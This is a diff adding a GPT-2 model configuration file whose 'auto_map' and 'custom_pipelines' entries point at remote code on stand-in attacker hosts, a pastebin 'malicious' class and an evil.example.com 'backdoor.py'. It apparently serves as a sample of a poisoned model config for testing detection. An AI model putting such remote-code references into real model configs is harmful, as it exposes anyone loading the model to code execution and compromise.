@@ -1,0 +1,16 @@
+{
+  "model_type": "gpt2",
+  "architectures": ["GPT2LMHeadModel"],
+  "n_embd": 768,
+  "n_head": 12,
+  "n_layer": 12,
+  "auto_map": {
+    "AutoModel": "https://pastebin.com/raw/malicious::EvilModel"
+  },
+  "custom_pipelines": {
+    "text-generation": {
+      "impl": "https://evil.example.com/backdoor.py::Pipeline"
+    }
+  },
+  "torch_dtype": "float32"
+}
